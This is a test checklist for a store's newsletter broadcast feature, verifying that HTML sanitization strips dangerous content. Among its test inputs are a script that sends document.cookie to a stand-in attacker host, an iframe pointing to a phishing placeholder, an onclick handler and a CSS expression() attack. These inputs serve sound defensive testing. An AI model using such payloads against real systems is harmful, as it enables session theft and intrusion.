---
feature: newsletter-broadcast
updated: 2026-06-09
fixes: H5 (newsletter HTML sanitization), PR-#89
---

# UAT: Newsletter Broadcast — HTML Sanitization

**Reviewer account:** store_admin
**Pre-conditions:**

- Store has at least 1 active newsletter subscriber (subscribe via storefront footer)
- SMTP configured for the test store (or Resend key set) — or use the "preview HTML" feature
- Use staging environment only

---

## Golden path — Safe broadcast

1. Navigate to **Admin → Newsletter → Broadcast**
2. Enter subject: `Summer Sale — Up to 40% off`
3. Enter HTML body with safe formatting:
   ```html
   <p>Dear customer,</p>
   <p><b>Shop now</b> and save up to <a href="https://wadyaljuz.com/sale">40%</a>.</p>
   <ul>
     <li>Free shipping on orders over 10 KWD</li>
     <li>Same-day delivery in Kuwait</li>
   </ul>
   ```
4. Click **Preview** — verify the formatted email renders correctly
5. Click **Send / Broadcast**
6. Verify: 200/202 response, broadcast queued or sent
7. Check test inbox — email received, formatting intact, no extra content

---

## HTML injection test — script stripped

1. Enter HTML body with a `<script>` tag:
   ```html
   <p>Special offer!</p>
   <script>
     fetch('https://attacker.com/steal?c=' + document.cookie);
   </script>
   <p>Click the link below.</p>
   ```
2. Click **Preview**
3. Verify: the **preview does NOT execute JavaScript** and `<script>` tag is not shown in the rendered output
4. If the broadcast was sent, check the received email: verify no `<script>` tag in the HTML source

---

## HTML injection test — iframe stripped

1. Enter HTML body:
   ```html
   <p>Watch our video:</p>
   <iframe src="https://phishing.example.com"></iframe>
   ```
2. Send → verify the received email has no `<iframe>` in its HTML source

---

## HTML injection test — event handler stripped

1. Enter HTML body:
   ```html
   <p onclick="evil()">Click me</p>
   ```
2. Send → verify received email has no `onclick` attribute

---

## Edge cases

- [ ] **Empty HTML body** — submit with empty html → API should return a validation error (not 500)
- [ ] **Only plain text in HTML** — `<p>Hello world</p>` → sent as-is, no extra wrapping
- [ ] **Inline image (data:image/)** — `<img src="data:image/png;base64,...">` → should survive (inline images are safe in email)
- [ ] **Dangerous inline style** — `<p style="background:expression(alert(1))">` → the `expression()` CSS attack stripped; safe styles preserved
- [ ] **No subscribers** — broadcast to a store with 0 active subscribers → 200 with `sent: 0`, no error
- [ ] **Subject with Arabic text** — Arabic subject line → sends correctly, no encoding error

---

## Pass criteria

- [ ] `<script>` and its content are removed from broadcast HTML
- [ ] `<iframe>` removed from broadcast HTML
- [ ] `onclick` and other `on*` event handlers removed
- [ ] Safe formatting tags (`<b>`, `<p>`, `<a href="https://...">`, `<ul>`, `<li>`) preserved
- [ ] `data:image/` inline images preserved
- [ ] Broadcast does not 500 on any of the above inputs
